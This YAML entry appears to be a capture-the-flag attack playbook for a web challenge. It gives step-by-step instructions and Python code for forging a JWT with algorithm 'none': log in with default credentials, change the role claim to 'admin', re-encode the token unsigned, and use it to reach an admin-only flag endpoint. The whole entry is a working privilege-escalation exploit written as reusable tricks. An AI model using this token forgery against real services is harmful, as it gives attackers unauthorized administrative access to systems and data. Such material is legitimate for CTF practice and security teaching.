name: jwt_tamper_algorithm_none
category: web
tags: [jwt, privilege_escalation, algorithm_none, signature_bypass, flask]
indicators:
  - "JWT encoded with algorithm='none'"
  - "JWT decoded with verify_signature=False"
  - "Token contains role field"
  - "Admin-only endpoints exist"
  - "Default user credentials available"

tricks:
  - name: "Step 1: Identify JWT vulnerability"
    when: "Found JWT token in cookies"
    how: "Check JWT encoding/decoding implementation"
    payload: |
      # Check py:
      # Line 27: jwt.encode(..., algorithm='none')
      # Line 44, 61: jwt.decode(..., options={"verify_signature": False})
      # No signature verification = can tamper token

  - name: "Step 2: Login and get token"
    when: "Need initial JWT token"
    how: "Login with default credentials"
    payload: |
      POST /login
      username=user&password=user
      # Token stored in cookie: token

  - name: "Step 3: Decode JWT payload"
    when: "Have JWT token"
    how: "Decode without signature verification"
    payload: |
      # Manual decode or use jwt.decode with verify_signature=False
      # Payload: {"username": "user", "role": "user"}

  - name: "Step 4: Tamper JWT - change role to admin"
    when: "Decoded payload shows role='user'"
    how: "Modify role field and re-encode with algorithm='none'"
    payload: |
      # Modify payload:
      payload['role'] = 'admin'
      
      # Re-encode with algorithm='none' (no signature):
      header = {"alg": "none", "typ": "JWT"}
      header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
      payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
      tampered_token = f"{header_b64}.{payload_b64}."

  - name: "Step 5: Use tampered token"
    when: "Have tampered token"
    how: "Set token cookie and access admin endpoints"
    payload: |
      # Set cookie with tampered token
      cookies = {'token': tampered_token}
      
      # Verify privilege escalation:
      GET /profile
      # Should show "ADMIN" instead of "USER"
      
      # Access admin-only endpoint:
      GET /gettheflag
      # Returns flag

